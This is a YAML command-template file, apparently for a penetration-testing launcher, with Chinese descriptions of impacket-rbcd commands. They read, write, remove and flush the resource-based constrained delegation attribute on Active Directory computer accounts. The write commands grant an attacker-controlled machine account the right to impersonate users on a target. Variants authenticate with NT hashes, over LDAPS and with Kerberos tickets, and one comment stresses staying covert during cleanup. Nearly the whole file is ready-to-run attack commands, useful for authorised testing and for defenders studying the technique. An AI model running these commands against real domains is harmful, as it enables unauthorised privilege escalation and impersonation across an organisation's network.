tool: impacket-rbcd
tags: [active-directory, kerberos, pentest, exploitation, privilege-escalation, rbcd, impacket, security]

actions:
  # === RECONNAISSANCE AND READING ===
  - title: impacket-rbcd - 读取 RBCD 状态
    desc: |
      读取目标计算机帐户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。
      这是验证现有委派或确认之前写入操作是否成功的初始步骤。
      它有助于识别目标是否已经存在漏洞，或在评估期间是否被篡改。
      你必须拥有足够权限读取目标计算机对象的 DACL。
    command: "impacket-rbcd -delegate-to {{target_computer}} -action read -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"

  # === EXPLOITATION / WRITING ===
  - title: impacket-rbcd - 授予委派权限（写入）
    desc: |
      通过写入 msDS-AllowedToActOnBehalfOfOtherIdentity 属性来配置基于资源的约束委派。
      此命令允许“delegate-from”帐户（通常是攻击者控制的计算机帐户）针对“delegate-to”目标模拟用户。
      一旦创建或攻陷计算机帐户，这就是 RBCD 攻击路径中的核心命令。
      请注意，这需要拥有目标计算机对象的“GenericWrite”或“WriteProperty”权限。
    command: "impacket-rbcd -delegate-to {{target_computer}} -delegate-from {{attacker_computer}} -action write -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"

  - title: impacket-rbcd - 使用 NTLM 哈希写入委派
    desc: |
      使用 NTLM 哈希而非明文密码执行 RBCD 写入操作。
      当你已进行凭据转储且只拥有用户的 NT 哈希时特别有用。
      如果 LM 哈希不可用或环境中已禁用，可将其填充为零。
      务必确保“dc-ip”指向从你当前网络位置可达的有效域控制器。
    command: "impacket-rbcd -delegate-to {{target_computer}} -delegate-from {{attacker_computer}} -action write -hashes {{lmhash|00000000000000000000000000000000}}:{{nthash}} -dc-ip {{dc_ip}} {{domain}}/{{username}}"

  - title: impacket-rbcd - 通过 LDAPS 写入委派
    desc: |
      通过加密的 LDAPS（基于 SSL 的 LDAP）连接执行 RBCD 写入操作。
      出于安全考虑，许多现代域控制器强制要求 LDAP 签名，或要求某些属性修改必须使用 LDAPS。
      使用 -use-ldaps 标志可绕过与“LDAP Signing Required”相关的问题。
      确保使用正确的端口（通常是 636），或所提供的 DC-IP 支持 SSL。
    command: "impacket-rbcd -delegate-to {{target_computer}} -delegate-from {{attacker_computer}} -action write -use-ldaps -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"

  # === POST-EXPLOITATION / CLEANUP ===
  - title: impacket-rbcd - 移除特定委派
    desc: |
      从目标委派列表中移除特定攻击者控制的计算机帐户。
      这用于精确清理，只移除你的特定条目，同时保留其他可能的委派。
      这是保持隐蔽并在测试后将环境恢复到原始配置的关键步骤。
      此操作需要与初始委派设置相同的写入权限。
    command: "impacket-rbcd -delegate-to {{target_computer}} -delegate-from {{attacker_computer}} -action remove -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"

  - title: impacket-rbcd - 清除所有委派
    desc: |
      完全清空目标计算机上的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。
      使用此命令一次性移除所有已配置的 RBCD 条目，从而将该属性重置为空。
      在生产环境中使用时要小心，因为它可能会移除管理员配置的合法委派。
      这是确保任何帐户都无法代表他人对指定目标进行操作的最彻底方式。
    command: "impacket-rbcd -delegate-to {{target_computer}} -action flush -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"

  # === ADVANCED AUTHENTICATION ===
  - title: impacket-rbcd - Kerberos 身份验证（传递票据）
    desc: |
      使用 Kerberos 票据进行身份验证，而非在命令行上提供密码或哈希。
      这需要一个有效的 Kerberos 缓存文件（ccache）导出到 KRB5CCNAME 环境变量。
      -k 标志告诉工具使用 Kerberos，-no-pass 阻止其提示输入密码。
      在启用 Kerberos 强制要求的环境或使用 Rubeus 等工具管理票据时，这是首选方法。
    command: "impacket-rbcd -delegate-to {{target_computer|TARGET_SRV}} -delegate-from {{attacker_computer|EVIL_PC}} -action write -k -no-pass -dc-ip {{dc_ip}} {{domain}}/{{username}}"

  - title: impacket-rbcd - 调试和时间戳
    desc: |
      启用详细调试输出并为日志信息添加时间戳。
      这对于排查连接问题、身份验证失败或 LDAP 错误非常有帮助。
      调试输出会揭示底层的 Impacket 逻辑以及域控制器返回的精确错误代码。
      当工具静默失败或返回通用的“Access Denied”消息时，使用此选项查找根本原因。
    command: "impacket-rbcd -delegate-to {{target_computer}} -action read -debug -ts -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}"
